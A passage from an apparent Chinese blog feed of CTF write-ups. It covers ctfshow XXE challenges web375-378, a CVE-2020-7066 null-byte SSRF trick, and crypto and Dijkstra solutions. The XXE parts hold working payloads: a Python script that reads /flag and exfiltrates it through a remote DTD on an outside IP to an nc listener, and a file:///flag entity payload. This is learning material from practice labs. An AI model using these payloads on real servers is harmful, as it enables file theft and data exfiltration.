，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&amp;#x25; vps），那就会解析（&amp;#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。</span></span><br><span class="line"><span class="comment">也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。</span></span><br><span class="line"><span class="comment">总结就是，%myurl 这种引用会自动向地址发送请求。 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">1</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法二：添加空格</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 上面是限制的语句--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 我们多添加一个空格就和整个句子不同了--&gt;</span></span><br></pre></td></tr></table></figure><p>绕过方法三：引号替换绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 上面是限制的语句--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml  version=&#x27;1.0&#x27; encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 我们双引号换成单引号就和整个句子不同了--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>比较与上题的区别，正则后面添加了一个&#x2F;i表示整个匹配不区分大小写</p><p>和上一题的payload相同</p><h3 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>我们来看和上题的区别，添加了对http的限制</p><p>在xml文档的编码中，不仅支持utf-8编码，同时也支持utf-16编码，所以我们也可以将payload转为utf-8编码，然后post传送数据</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c5cd315f-3854-4073-b5dc-42c8d51f32e4.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE hacker[</span></span><br><span class="line"><span class="string">    &lt;!ENTITY  % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;!ENTITY  % dtds SYSTEM &quot;http://154.8.183.198/test/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    %dtds;</span></span><br><span class="line"><span class="string">]&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;root&gt;</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">&lt;/root&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">re = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="comment">#b&#x27;\xff\xfe\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00h\x00a\x00c\x00k\x00e\x00r\x00[\x00\n\x00 \x00 \x00 \x00 \x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00 \x00 \x00 \x00 \x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00 \x00%\x00 \x00d\x00t\x00d\x00s\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x001\x005\x004\x00.\x008\x00.\x001\x008\x003\x00.\x001\x009\x008\x00/\x00t\x00e\x00s\x00t\x00/\x00t\x00e\x00s\x00t\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00\n\x00 \x00 \x00 \x00 \x00%\x00d\x00t\x00d\x00s\x00;\x00\n\x00]\x00&gt;\x00 \x00\n\x00\n\x00&lt;\x00r\x00o\x00o\x00t\x00&gt;\x00\n\x001\x00\n\x00&lt;\x00/\x00r\x00o\x00o\x00t\x00&gt;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>我们发现编码后http彻底绕过</p><p>然后nc连接，成功获得flag</p><h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>打开后是一个登录界面，ctrl+u查看一下源码</p><p>看到post里存在xxe</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192111760.png" alt="image-20250519211113702" loading="lazy"></p><p>访问&#x2F;doLogin，post传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY cmd SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;cmd;&lt;/username&gt;&lt;password&gt;&amp;cmd;&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192110602.png" alt="image-20250519211058311" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;XML语法&quot;&gt;&lt;a href=&quot;#XML语法&quot; class=&quot;headerlink&quot; title=&quot;XML语法&quot;&gt;&lt;/a&gt;XML语法&lt;/h3&gt;&lt;p&gt;1.是树形结构，必须具有根元素&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="xxe" scheme="https://kinseyy.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>[GKCTF2020]cve版签到</title>
    <link href="https://kinseyy.github.io/2025/05/15/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/"/>
    <id>https://kinseyy.github.io/2025/05/15/GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0/</id>
    <published>2025-05-15T10:47:06.000Z</published>
    <updated>2025-05-15T12:48:56.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066:</strong> 在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p><p>打开题目</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505152047571.png" alt="image-20250515204736447" loading="lazy"></p><p>F12之后在Headers中发现hint</p><p>两者结合利用零字符截断使get_headers()请求到本地127.0.0.1以及链接</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505152048665.png" alt="image-20250515204819615" loading="lazy"></p><p>提示必须以123结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.123%00www.ctfhub.com</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505152048815.png" alt="image-20250515204855768" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GKCTF2020-cve版签到&quot;&gt;&lt;a href=&quot;#GKCTF2020-cve版签到&quot; class=&quot;headerlink&quot; title=&quot;[GKCTF2020]cve版签到&quot;&gt;&lt;/a&gt;[GKCTF2020]cve版签到&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;cve-</summary>
      
    
    
    
    <category term="cve" scheme="https://kinseyy.github.io/categories/cve/"/>
    
    
    <category term="漏洞" scheme="https://kinseyy.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>crypto-</title>
    <link href="https://kinseyy.github.io/2025/05/11/crypto-1/"/>
    <id>https://kinseyy.github.io/2025/05/11/crypto-1/</id>
    <published>2025-05-11T06:33:47.000Z</published>
    <updated>2025-05-11T06:46:16.372Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Zer0pts2020-ROR"><a href="#Zer0pts2020-ROR" class="headerlink" title="[Zer0pts2020]ROR"></a>[Zer0pts2020]ROR</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">ror = <span class="keyword">lambda</span> x, l, b: (x &gt;&gt; l) | ((x &amp; ((<span class="number">1</span>&lt;&lt;l)-<span class="number">1</span>)) &lt;&lt; (b-l))</span><br><span class="line"></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> base <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]:</span><br><span class="line">    N *= <span class="built_in">pow</span>(base, random.randint(<span class="number">123</span>, <span class="number">456</span>))</span><br><span class="line">e = random.randint(<span class="number">271828</span>, <span class="number">314159</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; N.bit_length()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m.bit_length()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(ror(m, i, m.bit_length()), e, N))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题重点是看ror</p><p>我们知道了每次以bit为单元移动且题目告诉了我们所有位的pow结果</p><p>也就是题目想要我们逆向计算bin(m)的每一位来反推m<br>注意到n为偶数！！！ 而奇数mod偶数末位为1 偶数mod偶数末位为0！</p><p>所以根据每次pow的结果我们可以确定一个比特位！！！</p><p>最后取个反序 long_to_bytes即可得到flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey.RSA <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;.\chall.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.readlines()</span><br><span class="line"></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">    s = <span class="built_in">int</span>(s,<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> s%<span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">        m += <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>(m[::-<span class="number">1</span>],<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Zer0pts2020-ROR&quot;&gt;&lt;a href=&quot;#Zer0pts2020-ROR&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]ROR&quot;&gt;&lt;/a&gt;[Zer0pts2020]ROR&lt;/h2&gt;&lt;figure class=&quot;high</summary>
      
    
    
    
    <category term="密码笔记" scheme="https://kinseyy.github.io/categories/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="crypto" scheme="https://kinseyy.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>crypto-suanfa</title>
    <link href="https://kinseyy.github.io/2025/05/06/crypto-suanfa/"/>
    <id>https://kinseyy.github.io/2025/05/06/crypto-suanfa/</id>
    <published>2025-05-06T12:37:35.000Z</published>
    <updated>2025-07-24T03:31:27.640Z</updated>
    
    <content type="html"><![CDATA[<h4 id="网鼎杯-2020-青龙组-you-raise-me-up（大步小步算法）"><a href="#网鼎杯-2020-青龙组-you-raise-me-up（大步小步算法）" class="headerlink" title="[网鼎杯 2020 青龙组]you_raise_me_up（大步小步算法）"></a>[网鼎杯 2020 青龙组]you_raise_me_up（大步小步算法）</h4><p>首先，我们审计题目，可以发现题目中给予了我们m、c和n的值，其中n&#x3D;2**512,m则是在（2，m）之间的值，c是m^flag &#x3D; c mod n</p><p>可以看出，这是一道求指标的题目，我们可以通过以下方法进行计算，已知的条件为：</p><p>2^e &#x3D; c1 mod n   在这其中，除了e其余条件我们都已知，在这里，我们需要使用离散对数求解的思路：</p><blockquote><p>Shanks’s Babystep-Giantstep Algorithm算法：<br>1、n&#x3D;[ √n ]+1</p><p>2、构造两个列表</p><p>list1&#x3D;[1,g,g^2,g^3,……,g^n]</p><p>list2&#x3D;[h,hg^(-n),hg^(-2n),……,hg^(-n**2)]</p><p>3、在两个列表中，找到两个相同的数 g^i&#x3D;hg^(-jn)</p><p>&#x3D;&gt;g^(i+jn)&#x3D;h mod n</p><p>4、我们所求的e&#x3D;i+jn<br>python库应用：</p><p>python(sympy库)  x&#x3D;sympy.discrete_log(n,a,g)</p></blockquote><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><br><span class="line">c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><br><span class="line">n=2**512</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import sympy</span><br><span class="line">x=sympy.discrete_log(n,c,m)</span><br><span class="line">print(long_to_bytes(x))</span><br></pre></td></tr></table></figure><h4 id="救世捷径（dijstra算法）"><a href="#救世捷径（dijstra算法）" class="headerlink" title="救世捷径（dijstra算法）"></a>救世捷径（dijstra算法）</h4><p>这道题感觉跟acm的寻找最短路径一样.</p><p>txt文件中每行的前两个数字作为无向图的顶点，第三个数字是两顶点之间的距离，最后的字符串是两顶点之间的内容，将起点到终点最短路径经过的边上的内容组合起来便是flag。<br>单源点最短路径算法：dijstra算法。<br>一些想到哪是哪的tips写在这里咯：</p><p><strong>1.一些前期的初始化和数据处理</strong></p><p>1）初始化各点之间的距离为“无穷远”（在程序中用一个比较大的数代替这个无穷远的概念），一般可以直观地想出用27*27的二维数组存这些距离值（Python中是用list套list作为过去高级语言中二维数组的那种存在……而且要注意要初始化把list里面都放上东西才行！），之后我们就操作索引是1-26的那些元素，浪费掉位置0处的空间，但可以恰好对应顶点1-26，清晰明了~</p><p>2）按行读取题目txt文件中的内容，用的是readlines()，得到的数据形式是每行作为一个元素组成的list。然后用strip()去掉行尾的换行符’\n’，再用split(’ ‘)将每行内容按空格分割组成新的list，方便后面在程序中的调用。</p><p>3）因为在2）步中已经分割出了每行的元素，就可以用2）步中的数据去初始化1）步中27*27的list中的数据，把已知的那些两点之间的距离放入即可，具体写法见程序代码。</p><p><strong>2.实现dijstra算法的函数</strong></p><p>1）初始化一个长度是27，元素全是0xffff（代表距离很远）的list，用于记录当前顶点（索引与顶点序号一致是1-26）对于顶点1的最短距离。</p><p>2）初始化一个长度为27，元素全是0的list，元素值用于记录当前顶点（索引与顶点序号一致是1-26）是否已经找到了距离顶点1的最短路径，确定了最短路径就置该顶点序号对应索引值的元素为1。后面将这里元素值是1的顶点称为“已经确定的集合”。每次更新完各顶点到顶点1的距离后，找到最短的一个，将该顶点位置元素置1，该顶点就不再参与后续的遍历。</p><p>3）初始化一个长度为27，元素全是1的list，用于记录当前顶点到顶点1的最短路径的前驱顶点，用于最后回溯路径。</p><p><strong>过程：</strong></p><p>首先找到和顶点1直连的顶点，找到这些顶点中距离顶点1最短的一个顶点，将该顶点加入“已经确定的集合“，遍历该顶点的邻接顶点，更新顶点1到各个邻接顶点的最短距离。再找到现在与顶点1距离最短的顶点（在”已经确定的集合“中的顶点就不再遍历），再去遍历该顶点的邻接顶点，更新顶点1到这些邻接顶点的最短距离，从中找到距离最短的顶点加入“已经确定的集合”，再遍历该顶点的邻接顶点，更新这些顶点与顶点1的最短距离，找到与顶点1距离最短的顶点……以此循环直至所有顶点都加入“确定的集合”。</p><p>核心思想：</p><p>每次循环都找到当前距离顶点1最近的一个顶点，判断路径中经过该顶点后再到达与其邻接的其他顶点的距离，是否比之前存储的这些顶点到顶点1的距离更短，如果更短就更新对应顶点到顶点1的最短距离，更新完后再找到与顶点1距离最短的顶点重复上述操作。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">graph=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    graph.append([]) <span class="comment">#在一个list中放27个list，索引0-26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        graph[i].append(<span class="number">0xffff</span>) <span class="comment">#先将图中各个顶点之间的距离初始化为一个比较大的数</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./Downloads/dij.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()  <span class="comment">#按行读取，每行内容是list中的一个元素，全部内容组成一个整体的list</span></span><br><span class="line"><span class="comment">#这里需要先手动将txt文件中的最后一行换行去掉否则会多一个&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment">#print(f)</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</span><br><span class="line">    li.append(x.strip().split(<span class="string">&#x27; &#x27;</span>)) <span class="comment">#strip()删除字符串前后空格，这里是去掉了最后的换行符&#x27;\n&#x27;，然后再按&#x27; &#x27;分割每行的每个元素，原本在同一子list中的一行元素也彼此独立出来</span></span><br><span class="line"><span class="comment">#print(li)</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> li:</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">0</span>])][<span class="built_in">int</span>(x[<span class="number">1</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">1</span>])][<span class="built_in">int</span>(x[<span class="number">0</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_dijstra</span>():</span><br><span class="line">    min_d=[<span class="number">0xffff</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]  <span class="comment">#记录点i到起点1的最短距离</span></span><br><span class="line">    route=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]  <span class="comment">#记录前驱顶点</span></span><br><span class="line">    isSure=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]  <span class="comment">#记录各点到起点距离是否已经确定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">        min_d[i]=graph[i][<span class="number">1</span>]  <span class="comment">#初始化一下能直连1的顶点和1的距离</span></span><br><span class="line">    min_d[<span class="number">1</span>]=<span class="number">0</span></span><br><span class="line">    isSure[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="built_in">min</span>=<span class="number">0xfffff</span></span><br><span class="line">        temp=-<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>): <span class="comment"># 找到当前离顶点1最近的顶点加入已经确定的“顶点阵营”</span></span><br><span class="line">            <span class="keyword">if</span> isSure[j]==<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">min</span>&gt;min_d[j]:</span><br><span class="line">                <span class="built_in">min</span>=min_d[j]</span><br><span class="line">                temp=j</span><br><span class="line">        isSure[temp]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):<span class="comment"># 判断从顶点1开始，在经过该顶点后，再到达其邻接顶点的距离，是否比其邻接顶点原本到顶点1的距离更近，如果更近就更新最短距离</span></span><br><span class="line">            <span class="keyword">if</span> min_d[j]&gt;min_d[temp]+graph[temp][j]:</span><br><span class="line">                min_d[j]=min_d[temp]+graph[temp][j]</span><br><span class="line">                route[j]=temp</span><br><span class="line">    <span class="keyword">return</span> (route,min_d)</span><br><span class="line"></span><br><span class="line">route,min_d=try_dijstra()</span><br><span class="line"><span class="built_in">print</span>(min_d[<span class="number">26</span>]) <span class="comment">#最短距离</span></span><br><span 